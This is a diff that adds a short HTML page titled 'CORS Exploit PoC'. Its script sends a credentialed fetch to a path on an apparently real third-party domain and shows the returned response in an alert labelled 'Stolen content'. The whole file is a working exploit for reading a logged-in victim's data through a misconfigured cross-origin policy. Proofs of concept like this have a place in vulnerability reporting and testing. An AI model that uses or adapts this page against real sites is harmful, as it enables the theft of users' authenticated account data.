@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS Exploit PoC</h2>
+    <script>
+    fetch("https://fico-ytl.com/cdn-cgi/rum", {
+      credentials: "include"
+    })
+    .then(res => res.text())
+    .then(data => {
+      alert("Stolen content:\n\n" + data);
+    });
+    </script>
+  </body>
+</html>
